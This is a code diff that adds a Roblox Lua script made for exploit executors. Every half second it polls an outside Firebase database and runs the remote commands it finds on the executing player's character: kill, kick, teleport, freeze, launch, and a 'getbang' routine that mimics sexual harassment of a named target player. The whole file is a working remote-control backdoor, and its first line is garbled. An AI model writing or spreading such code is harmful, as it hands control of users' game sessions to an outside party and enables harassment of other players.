@@ -1,1 +1,232 @@
-uwu
+uwllocal Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local Executer = Players.LocalPlayer
+local request = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+local DataLink = "https://adminsystem-9448b-default-rtdb.firebaseio.com/"..Executer.Name
+
+function GetPlayerWithPartialName(Name)
+  for i,v in ipairs(Players:GetPlayers()) do
+    if string.lower(v.Name):find(string.lower(Name)) then
+      return v
+    end
+  end
+  return false
+end
+
+local GetBangState = false
+
+function getbang(OwnerName,Args)
+task.spawn(function()
+  if GetBangState then
+    GetBangState = false
+  end
+  if not GetBangState then
+  GetBangState = true
+  while GetBangState do task.wait(0.0001)
+  local TargetPlayer = GetPlayerWithPartialName(Args[1])
+  if TargetPlayer then
+    local TargetCharacter = TargetPlayer.Character
+    local ExecuterCharacter = Executer.Character
+    if TargetCharacter and ExecuterCharacter then
+      local TargetRootPart = TargetCharacter:FindFirstChild("HumanoidRootPart")
+      local ExecuterRootPart = ExecuterCharacter:FindFirstChild("HumanoidRootPart")
+      if TargetRootPart and ExecuterRootPart then
+        for i = -1,-5,-1 do
+          ExecuterRootPart.CFrame = TargetRootPart.CFrame * CFrame.new(0,0,i)
+          task.wait(0.01)
+        end
+        for i = -5,-1,1 do
+          ExecuterRootPart.CFrame = TargetRootPart.CFrame * CFrame.new(0,0,i)
+          task.wait(0.01)
+        end
+      end
+    end
+  end
+  end
+end
+end)
+end
+
+function stopgetbang(OwnerName,Args)
+  GetBangState = false
+end
+
+
+function kill(OwnerName,Args)
+  local Character = Executer.Character
+  if Character then
+    Character:BreakJoints()
+  end
+end
+
+function kick(OwnerName,Args)
+  Executer:Kick("Fuiste expulsado por un administrador")
+end
+
+function teleport(OwnerName,Args)
+  local TeleportType = tostring(Args[1])
+  local Character = Executer.Character
+  if Character then
+    local RootPart = Character:FindFirstChild("HumanoidRootPart")
+    if RootPart then
+      if string.lower(TeleportType) == "cframe" then
+        local x = tonumber(Args[2]) or 0
+        local y = tonumber(Args[3]) or 0
+        local z = tonumber(Args[4]) or 0
+        RootPart.CFrame = CFrame.new(x,y,z)
+      elseif string.lower(TeleportType) == "player" then
+        local Target = Args[2]
+        local TargetPlayer = GetPlayerWithPartialName(tostring(Target))
+        if TargetPlayer then
+          local TargetCharacter = TargetPlayer.Character
+          if TargetCharacter then
+            local TargetRootPart = TargetCharacter:FindFirstChild("HumanoidRootPart")
+            if TargetRootPart then
+              RootPart.CFrame = TargetRootPart.CFrame
+            end
+          end
+        end
+      end
+    end
+  end
+end
+
+function freeze(OwnerName,Args)
+  local Character = Executer.Character
+  if Character then
+    for i,v in ipairs(Character:GetDescendants()) do
+      if v:IsA("BasePart") then
+        v.Anchored = true
+      end
+    end
+  end
+end
+
+function unfreeze(OwnerName,Args)
+  local Character = Executer.Character
+  if Character then
+    for i,v in ipairs(Character:GetDescendants()) do
+      if v:IsA("BasePart") then
+        v.Anchored = false
+      end
+    end
+  end
+end
+
+function krillin(OwnerName,Args)
+  local Character = Executer.Character
+  if Character then
+    local RootPart = Character:FindFirstChild("HumanoidRootPart")
+    if RootPart then
+      local BodyVelocity = Instance.new("BodyVelocity")
+      BodyVelocity.Velocity = Vector3.new(0,5,0)
+      BodyVelocity.MaxForce = Vector3.new(9e7,9e7,9e7)
+      BodyVelocity.Parent = RootPart
+      task.wait(2)
+      BodyVelocity.Velocity = Vector3.new(0,100,0)
+      task.wait(1)
+      Character:BreakJoints()
+    end
+  end
+end
+
+function launch(OwnerName,Args)
+  local Character = Executer.Character
+  if Character then
+    local RootPart = Character:FindFirstChild("HumanoidRootPart")
+    if RootPart then
+      local BodyVelocity = Instance.new("BodyVelocity")
+      BodyVelocity.Velocity = Vector3.new(math.random(-500,500),math.random(0,500),math.random(-500,500))
+      BodyVelocity.MaxForce = Vector3.new(9e7,9e7,9e7)
+      BodyVelocity.Parent = RootPart
+      task.wait(1)
+      BodyVelocity:Destroy()
+    end
+  end
+end
+
+local Functions = {
+  kill = function(OwnerName,Args)
+    kill(OwnerName,Args)
+  end,
+  getbang = function(OwnerName,Args)
+    getbang(OwnerName,Args)
+  end,
+  getbangstop = function(OwnerName,Args)
+    stopgetbang(OwnerName,Args)
+  end,
+  kick = function(OwnerName,Args)
+    kick()
+  end,
+  teleport = function(OwnerName,Args)
+    teleport(OwnerName,Args)
+  end,
+  freeze = function(OwnerName,Args)
+    freeze(OwnerName,Args)
+  end,
+  unfreeze = function(OwnerName,Args)
+    unfreeze(OwnerName,Args)
+  end,
+  krillin = function(OwnerName,Args)
+    krillin(OwnerName,Args)
+  end,
+  launch = function(OwnerName,Args)
+    launch(OwnerName,Args)
+  end
+}
+
+
+function ExecuteCommand(OwnerName,CommandName,Args)
+  local Func = Functions[CommandName]
+  
+  if Func then
+    task.spawn(function()
+    Func(OwnerName,Args)
+    end)
+  end
+end
+
+function UpdateState(Key)
+  local UpdateData = {
+    Executed = true
+  }
+  request({
+    Url = DataLink.."/"..Key..".json",
+    Method = "PATCH",
+    Headers = {
+            ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(UpdateData)
+  })
+end
+
+function FindAndExecuteCommands()
+  if DataLink then
+  local response = request({
+    Url = DataLink..".json",
+    Method = "GET",
+  })
+
+if response and response.Success then
+  local Data = HttpService:JSONDecode(response.Body)
+  
+if Data then
+  for Key,DataCommand in pairs(Data) do
+    if not DataCommand.Executed then
+      ExecuteCommand(DataCommand.OwnerName,string.lower(DataCommand.Command),DataCommand.Arguments)
+      UpdateState(Key)
+    end
+  end
+end
+end
+  end
+end
+
+task.spawn(function()
+while true do task.wait(0.5)
+pcall(FindAndExecuteCommands)
+end
+end)
+
+
